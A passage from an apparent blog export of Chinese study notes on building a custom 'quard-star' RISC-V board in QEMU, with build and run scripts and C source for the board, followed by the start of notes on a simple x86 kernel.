<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412220547572.png" alt="image-20240412220547572" style="zoom: 80%;">

<blockquote>
<p>0 </p>
</blockquote>
<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412220634891.png" alt="image-20240412220634891" style="zoom:80%;">

<blockquote>
<p>1</p>
</blockquote>
<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412220706401.png" alt="image-20240412220706401" style="zoom:80%;">

<blockquote>
<p>双控状态</p>
</blockquote>
<img src="/2024/04/08/ysyx-%E9%A2%84%E5%AD%A6%E4%B9%A0%E9%98%B6%E6%AE%B5/image-20240412221307079.png" alt="image-20240412221307079" style="zoom:80%;">]]></content>
      <categories>
        <category>ysyx</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，ysyx</tag>
      </tags>
  </entry>
  <entry>
    <title>基于qemu-riscv构建嵌入式系统</title>
    <url>/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h1 id="1-引言-板卡环境搭建"><a href="#1-引言-板卡环境搭建" class="headerlink" title="1.引言-板卡环境搭建"></a>1.引言-板卡环境搭建</h1><h2 id="1-1-qemu-环境搭建"><a href="#1-1-qemu-环境搭建" class="headerlink" title="1.1 qemu 环境搭建"></a>1.1 qemu 环境搭建</h2><h3 id="主要参考文章："><a href="#主要参考文章：" class="headerlink" title="主要参考文章："></a>主要参考文章：</h3><ol>
<li><a href="https://quard-star-tutorial.readthedocs.io/zh-cn/latest/ch2.html">基于qemu-riscv从0开始构建嵌入式linux系统ch2. 添加qemu仿真板——Quard-Star板 — 主页 (quard-star-tutorial.readthedocs.io)</a></li>
<li><a href="https://yanglianoo.github.io/2023/06/12/QEMU%E4%B8%AD%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BC%80%E5%8F%91%E6%9D%BF/">1.新建quard-star开发板 | TimerのBlog (yanglianoo.github.io)</a></li>
<li><a href="https://blog.csdn.net/qq_42878531/article/details/124755865">【RISC-V】risc-v架构学习笔记（架构初学）_riscv mtvec-CSDN博客</a></li>
<li><a href="https://www.qemu.org/docs/master/system/riscv/virt.html">‘virt’ 通用虚拟平台 （virt） — QEMU 文档</a></li>
</ol>
<p><strong>写这个 blog 主要记录一下学习过程，再次感谢!!</strong></p>
<p>硬件架构图：</p>
<p><img src="https://github.com/QQxiaoming/quard_star_tutorial/raw/main/tutorial/img/img3.png" alt="硬件架构"></p>
<h3 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h3><p><code>Ubuntu22.04 + qemu8.0.0</code></p>
<h3 id="qemu-环境配置："><a href="#qemu-环境配置：" class="headerlink" title="qemu 环境配置："></a>qemu 环境配置：</h3><p>新建 build.sh 文件，用于qemu的编译，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd qemu-8.0.0</span><br><span class="line">if [ ! -d &quot;$SHELL_FOLDER/output/qemu&quot; ]; then  </span><br><span class="line">./configure --prefix=$SHELL_FOLDER/output/qemu  --target-list=riscv64-softmmu --enable-gtk  --enable-virtfs --disable-gio</span><br><span class="line">fi  </span><br><span class="line">make -j16</span><br><span class="line">make install</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>注意：这种的环境变量并没有添加到终端中，终端并不能直接执行shell命令，需要去到<code>qemu/bin</code>下面才能执行，所以需要将路径添加到<code>zshrc</code>中</li>
</ul>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$PATH:/home/liangzhou/桌面/riscv code/output/qemu/bin</span><br></pre></td></tr></table></figure>

<p><img src="/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/image-20240326112910836.png" alt="image-20240326112910836"></p>
<ul>
<li>然后在终端输入：<code>qemu-system-riscv64 --version</code></li>
</ul>
<h2 id="1-2-新建板卡"><a href="#1-2-新建板卡" class="headerlink" title="1.2 新建板卡"></a>1.2 新建板卡</h2><p>需要增加两个文件以及并修改四个文件</p>
<ol>
<li>在 <code>/qemu8.0.0/hw/riscv</code> 下 增加quard_star.c</li>
<li>在 <code>/qemu8.0.0/include/hw/riscv</code> 下 增加quard_star.h</li>
<li>修改 <code>qemu-8.0.0/configs/devices/riscv64-softmmu/default.mak</code>    <code>CONFIG QUARD STAR=y</code>   启动板卡配置</li>
<li>修改 <code>qemu-8.0.0/configs/devices/riscv32-softmmu/default.mak</code>    同上</li>
<li>修改 <code>qemu-8.0.0/hw/riscv/meson.build</code>    — 作用：添加 源文件以及依赖  <ol>
<li><img src="/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/image-20240326115307621.png" alt="image-20240326115307621"></li>
</ol>
</li>
<li>修改 <code>qemu-8.0.0/hw/riscv/Kconfig</code>    — 作用 用于 QEMU 中 RISC-V 硬件模拟的配置<ol>
<li><img src="/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/image-20240326115434463.png" alt="image-20240326115434463"></li>
</ol>
</li>
</ol>
<h3 id="1-2-1-quard-star-h"><a href="#1-2-1-quard-star-h" class="headerlink" title="1.2.1 quard_star.h"></a>1.2.1 quard_star.h</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HW_RISCV_QUARD_STAR__H   <span class="comment">// 预处理指令放置头文件被重复包含</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HW_RISCV_QUARD_STAR__H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/riscv_hart.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/sysbus.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qom/object.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/block/flash.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_CPUS_MAX 8     <span class="comment">// 定义quard_star 最大CPU数 = 8  --- 上面硬件架构图</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> QUARD_STAR_SOCKETS_MAX 8  <span class="comment">// 定义最大插槽数 也为 8 </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TYPE_RISCV_QUARD_STAR_MACHINE MACHINE_TYPE_NAME(<span class="string">&quot;quard-star&quot;</span>) <span class="comment">// 定义了机器名称</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">QuardStarState</span> QuardStarState;  <span class="comment">// 结构体前置声明  用于解决两个结构体互相依赖的问题</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">DECLARE_INSTANCE_CHECKER</span>(QuardStarState, RISCV_VIRT_MACHINE,</span><br><span class="line">                         TYPE_RISCV_QUARD_STAR_MACHINE)    <span class="comment">// 实例化一个检查函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">QuardStarState</span> &#123;</span><br><span class="line">    <span class="comment">/*&lt; private &gt;*/</span></span><br><span class="line">    MachineState parent;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*&lt; public &gt;*/</span></span><br><span class="line">    RISCVHartArrayState soc[QUARD_STAR_SOCKETS_MAX];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 枚举定义 定义了 资源 MROM等</span></span><br><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">    QUARD_STAR_MROM,</span><br><span class="line">    QUARD_STAR_SRAM,</span><br><span class="line">    QUARD_STAR_UART0,</span><br><span class="line">    QUARD_STAR_DRAM,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> &#123;</span><br><span class="line">    QUARD_STAR_UART0_IRQ = <span class="number">10</span>,  <span class="comment">//定义了串口中断号为10</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h3 id="1-2-2-quard-star-c"><a href="#1-2-2-quard-star-c" class="headerlink" title="1.2.2 quard_star.c"></a>1.2.2 quard_star.c</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/osdep.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/units.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/error-report.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qemu/guest-random.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;qapi/error.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/boards.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/loader.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/sysbus.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/qdev-properties.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/char/serial.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;target/riscv/cpu.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/riscv_hart.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/quard_star.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/boot.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/riscv/numa.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/intc/riscv_aclint.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;hw/intc/riscv_aplic.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;chardev/char.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/device_tree.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/sysemu.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/kvm.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sysemu/tpm.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 结构体数组中添加硬件地址 和映射的长度地址 前一个是基址 后一个是长度</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* 创建CPU */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_cpu_create</span><span class="params">(MachineState *machine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i, base_hartid, hart_count;</span><br><span class="line">    <span class="type">char</span> *soc_name;</span><br><span class="line">    QuardStarState *s = <span class="built_in">RISCV_VIRT_MACHINE</span>(machine);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (QUARD_STAR_SOCKETS_MAX &lt; <span class="built_in">riscv_socket_count</span>(machine)) &#123;</span><br><span class="line">        <span class="built_in">error_report</span>(<span class="string">&quot;number of sockets/nodes should be less than %d&quot;</span>,</span><br><span class="line">            QUARD_STAR_SOCKETS_MAX);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="built_in">riscv_socket_count</span>(machine); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">riscv_socket_check_hartids</span>(machine, i)) &#123;</span><br><span class="line">            <span class="built_in">error_report</span>(<span class="string">&quot;discontinuous hartids in socket%d&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        base_hartid = <span class="built_in">riscv_socket_first_hartid</span>(machine, i);</span><br><span class="line">        <span class="keyword">if</span> (base_hartid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">error_report</span>(<span class="string">&quot;can&#x27;t find hartid base for socket%d&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hart_count = <span class="built_in">riscv_socket_hart_count</span>(machine, i);</span><br><span class="line">        <span class="keyword">if</span> (hart_count &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">error_report</span>(<span class="string">&quot;can&#x27;t find hart count for socket%d&quot;</span>, i);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        soc_name = <span class="built_in">g_strdup_printf</span>(<span class="string">&quot;soc%d&quot;</span>, i);</span><br><span class="line">        <span class="built_in">object_initialize_child</span>(<span class="built_in">OBJECT</span>(machine), soc_name, &amp;s-&gt;soc[i],</span><br><span class="line">                                TYPE_RISCV_HART_ARRAY);</span><br><span class="line">        <span class="built_in">g_free</span>(soc_name);</span><br><span class="line">        <span class="built_in">object_property_set_str</span>(<span class="built_in">OBJECT</span>(&amp;s-&gt;soc[i]), <span class="string">&quot;cpu-type&quot;</span>,</span><br><span class="line">                                machine-&gt;cpu_type, &amp;error_abort);</span><br><span class="line">        <span class="built_in">object_property_set_int</span>(<span class="built_in">OBJECT</span>(&amp;s-&gt;soc[i]), <span class="string">&quot;hartid-base&quot;</span>,</span><br><span class="line">                                base_hartid, &amp;error_abort);</span><br><span class="line">        <span class="built_in">object_property_set_int</span>(<span class="built_in">OBJECT</span>(&amp;s-&gt;soc[i]), <span class="string">&quot;num-harts&quot;</span>,</span><br><span class="line">                                hart_count, &amp;error_abort);</span><br><span class="line">        <span class="built_in">sysbus_realize</span>(<span class="built_in">SYS_BUS_DEVICE</span>(&amp;s-&gt;soc[i]), &amp;error_abort);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  创建内存 */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_memory_create</span><span class="params">(MachineState *machine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    QuardStarState *s = <span class="built_in">RISCV_VIRT_MACHINE</span>(machine);</span><br><span class="line">    MemoryRegion *system_memory = <span class="built_in">get_system_memory</span>();</span><br><span class="line">    <span class="comment">//分配三片存储空间 dram sram mrom</span></span><br><span class="line">    MemoryRegion *dram_mem = <span class="built_in">g_new</span>(MemoryRegion, <span class="number">1</span>);  <span class="comment">//DRAM</span></span><br><span class="line">    MemoryRegion *sram_mem = <span class="built_in">g_new</span>(MemoryRegion, <span class="number">1</span>);  <span class="comment">//SRAM</span></span><br><span class="line">    MemoryRegion *mask_rom = <span class="built_in">g_new</span>(MemoryRegion, <span class="number">1</span>);  <span class="comment">//MROM  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_ram</span>(dram_mem, <span class="literal">NULL</span>, <span class="string">&quot;riscv_quard_star_board.dram&quot;</span>,</span><br><span class="line">                           quard_star_memmap[QUARD_STAR_DRAM].size, &amp;error_fatal);</span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, </span><br><span class="line">                                quard_star_memmap[QUARD_STAR_DRAM].base, dram_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_ram</span>(sram_mem, <span class="literal">NULL</span>, <span class="string">&quot;riscv_quard_star_board.sram&quot;</span>,</span><br><span class="line">                           quard_star_memmap[QUARD_STAR_SRAM].size, &amp;error_fatal);</span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, </span><br><span class="line">                                quard_star_memmap[QUARD_STAR_SRAM].base, sram_mem);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memory_region_init_rom</span>(mask_rom, <span class="literal">NULL</span>, <span class="string">&quot;riscv_quard_star_board.mrom&quot;</span>,</span><br><span class="line">                           quard_star_memmap[QUARD_STAR_MROM].size, &amp;error_fatal);</span><br><span class="line">    <span class="built_in">memory_region_add_subregion</span>(system_memory, </span><br><span class="line">                                quard_star_memmap[QUARD_STAR_MROM].base, mask_rom);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">riscv_setup_rom_reset_vec</span>(machine, &amp;s-&gt;soc[<span class="number">0</span>], </span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].size,</span><br><span class="line">                              <span class="number">0x0</span>, <span class="number">0x0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* quard-star 初始化各种硬件 资源 cpu 内存等 后面会扩展 can flash i2c等等 */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> quard_star_mach                                                                                                                                    <span class="title">ine_init</span><span class="params">(MachineState *machine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// 创建CPU</span></span><br><span class="line">   <span class="built_in">quard_star_cpu_create</span>(machine);</span><br><span class="line">   <span class="comment">// 创建主存</span></span><br><span class="line">   <span class="built_in">quard_star_memory_create</span>(machine);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_instance_init</span><span class="params">(Object *obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 创建machine */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MachineClass *mc = <span class="built_in">MACHINE_CLASS</span>(oc);</span><br><span class="line"></span><br><span class="line">    mc-&gt;desc = <span class="string">&quot;RISC-V Quard Star board&quot;</span>;</span><br><span class="line">    mc-&gt;init = quard_star_machine_init;    <span class="comment">// 初始化板卡资源 以及 最大支持的smp核心数</span></span><br><span class="line">    mc-&gt;max_cpus = QUARD_STAR_CPUS_MAX;</span><br><span class="line">    mc-&gt;default_cpu_type = TYPE_RISCV_CPU_BASE;</span><br><span class="line">    mc-&gt;pci_allow_0_address = <span class="literal">true</span>;</span><br><span class="line">    mc-&gt;possible_cpu_arch_ids = riscv_numa_possible_cpu_arch_ids;</span><br><span class="line">    mc-&gt;cpu_index_to_instance_props = riscv_numa_cpu_index_to_props;</span><br><span class="line">    mc-&gt;get_default_cpu_node_id = riscv_numa_get_default_cpu_node_id;</span><br><span class="line">    mc-&gt;numa_mem_supported = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 注册 quard-star 定义了 */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo quard_star_machine_typeinfo = &#123;</span><br><span class="line">    .name       = <span class="built_in">MACHINE_TYPE_NAME</span>(<span class="string">&quot;quard-star&quot;</span>),</span><br><span class="line">    .parent     = TYPE_MACHINE,</span><br><span class="line">    .class_init = quard_star_machine_class_init,</span><br><span class="line">    .instance_init = quard_star_machine_instance_init,</span><br><span class="line">    .instance_size = <span class="built_in">sizeof</span>(QuardStarState),</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">         &#123; TYPE_HOTPLUG_HANDLER &#125;,</span><br><span class="line">         &#123; &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_init_register_types</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">type_register_static</span>(&amp;quard_star_machine_typeinfo);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">type_init</span>(quard_star_machine_init_register_types) </span><br><span class="line">    <span class="comment">// 类的注册</span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>注意： 格式是 基址， 长度</p>
<p>MenMapEntry 结构体定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">MemMapEntry</span> &#123;</span></span><br><span class="line">    hwaddr base; <span class="comment">//基址</span></span><br><span class="line">    hwaddr size; <span class="comment">//长度</span></span><br><span class="line">&#125; MemMapEntry;</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemMapEntry quard_star_memmap[] = &#123;</span><br><span class="line">    [QUARD_STAR_MROM]  = &#123;        <span class="number">0x0</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_SRAM]  = &#123;     <span class="number">0x8000</span>,        <span class="number">0x8000</span> &#125;,</span><br><span class="line">    [QUARD_STAR_UART0] = &#123; <span class="number">0x10000000</span>,         <span class="number">0x100</span> &#125;,</span><br><span class="line">    [QUARD_STAR_DRAM]  = &#123; <span class="number">0x80000000</span>,          <span class="number">0x80</span> &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ol>
<li><code>MRON</code>（maskrom） 用于cpu启动时固定执行其内部的代码。</li>
<li><code>SRAM</code> 为早期启动代码时数据存放的空间。</li>
</ol>
<blockquote>
<p><code>riscv_setup_rom_reset_vec</code> 在boot.c中 函数的各个参数的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">riscv_setup_rom_reset_vec</span><span class="params">(MachineState *machine, RISCVHartArrayState *harts,</span></span><br><span class="line"><span class="params">                               hwaddr start_addr,</span></span><br><span class="line"><span class="params">                               hwaddr rom_base, </span></span><br><span class="line"><span class="params">                               hwaddr rom_size,</span></span><br><span class="line"><span class="params">                               <span class="type">uint64_t</span> kernel_entry, <span class="type">uint64_t</span> fdt_load_addr)</span></span><br></pre></td></tr></table></figure>


</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">riscv_setup_rom_reset_vec</span>(machine, &amp;s-&gt;soc[<span class="number">0</span>], </span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].base,</span><br><span class="line">                              quard_star_memmap[QUARD_STAR_MROM].size,</span><br><span class="line">                              <span class="number">0x0</span>, <span class="number">0x0</span>);</span><br></pre></td></tr></table></figure>

<ol>
<li>将cpu hart id 值加载到 a0寄存器 </li>
<li>设备树文件基地址加载到a1寄存器 然后跳转到下级运行代码</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 创建machine */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">quard_star_machine_class_init</span><span class="params">(ObjectClass *oc, <span class="type">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MachineClass *mc = <span class="built_in">MACHINE_CLASS</span>(oc);</span><br><span class="line"></span><br><span class="line">    mc-&gt;desc = <span class="string">&quot;RISC-V Quard Star board&quot;</span>;</span><br><span class="line">    mc-&gt;init = quard_star_machine_init;    <span class="comment">// 初始化板卡资源 以及 最大支持的smp核心数</span></span><br><span class="line">    mc-&gt;max_cpus = QUARD_STAR_CPUS_MAX;</span><br><span class="line">    mc-&gt;default_cpu_type = TYPE_RISCV_CPU_BASE;</span><br><span class="line">    mc-&gt;pci_allow_0_address = <span class="literal">true</span>;</span><br><span class="line">    mc-&gt;possible_cpu_arch_ids = riscv_numa_possible_cpu_arch_ids;</span><br><span class="line">    mc-&gt;cpu_index_to_instance_props = riscv_numa_cpu_index_to_props;</span><br><span class="line">    mc-&gt;get_default_cpu_node_id = riscv_numa_get_default_cpu_node_id;</span><br><span class="line">    mc-&gt;numa_mem_supported = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>初始化machine，将machine中的各个字段进行更新</li>
</ol>
<h3 id="1-2-3-文件执行"><a href="#1-2-3-文件执行" class="headerlink" title="1.2.3 文件执行"></a>1.2.3 文件执行</h3><blockquote>
<p>run.sh文件</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SHELL_FOLDER=$(cd &quot;$(dirname &quot;$0&quot;)&quot;;pwd)</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64 \</span></span><br><span class="line"><span class="language-bash">-M quard-star \</span></span><br><span class="line"><span class="language-bash">-m 1G \</span></span><br><span class="line"><span class="language-bash">-smp 8 \</span></span><br></pre></td></tr></table></figure>

<ol>
<li><code>$SHELL_FOLDER/output/qemu/bin/qemu-system-riscv64</code>: 使用完整路径指定<code>qemu-system-riscv64</code>的位置，这是QEMU中用于启动RISC-V 64位架构虚拟机的程序。路径依赖于第一行中设置的<code>SHELL_FOLDER</code>变量</li>
<li><code>-M quard-star</code>: 指定虚拟机使用的机器类型为“quard-star”，即我们之前定制的RISC-V机器模型。</li>
<li><code>-m 1G</code>: 为虚拟机分配1GB的内存。</li>
<li><code>-smp 8</code>: 配置虚拟机使用的处理器核心数为8，即虚拟机将模拟一个8核心的处理器。</li>
</ol>
<p>在qemu中输入 info qtree</p>
<p><img src="/2024/03/25/%E5%9F%BA%E4%BA%8Eqemu-riscv%E6%9E%84%E4%BB%B6%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/image-20240602213630396.png" alt="image-20240602213630396"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>基于x86架构的简单内核实现</title>
    <url>/2024/04/12/%E5%9F%BA%E4%BA%8Ex86%E6%9E%B6%E6%9E%84%E7%9A%84%E7%AE%80%E5%8D%95%E5%86%85%E6%A0%B8%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1-基础-环境配置与开发工具"><a href="#1-基础-环境配置与开发工具" class="headerlink" title="1.基础-环境配置与开发工具"></a>1.基础-环境配置与开发工具</h1><blockquote>
<p>本机环境：Ubuntu22.04 </p>
<p>需要的开发工具</p>
<p>编译器：gcc </p>
<p>链接器：ld</p>
<p>汇编编译器：nasm</p>
<p>虚拟机：qemu</p>
</blockquote>
<p><strong>参考：</strong></p>
<blockquote>
<ol>
<li><a href="https://github.com/hurley25/hurlex-doc/tree/master">hurley25&#x2F;hurlex-doc: hurlex 小内核分章节代码和文档 (github.com)</a></li>
<li></li>
</ol>
</blockquote>
<h2 id="1-1qemu"><a href="#1-1qemu" class="headerlink" title="1.1qemu"></a>1.1qemu</h2><p>qemu安装：我之前安装了qemu8.0.0 故就不重新安装了</p>
<blockquote>
<p>sudo ln -s &#x2F;usr&#x2F;bin&#x2F;qemu-system-i386 &#x2F;usr&#x2F;bin&#x2F;qemu</p>
<p>这个意思是后面直接可以用qemu代替 qemu-system-i386，会方便一些 但我觉得没有必要 </p>
</blockquote>
<h2 id="1-2-Makefile-文件"><a href="#1-2-Makefile-文件" class="headerlink" title="1.2 Makefile 文件"></a>1.2 Makefile 文件</h2><blockquote>
<p>给出详细的注释，项目基本上以这个Makefile为主</p>
</blockquote>
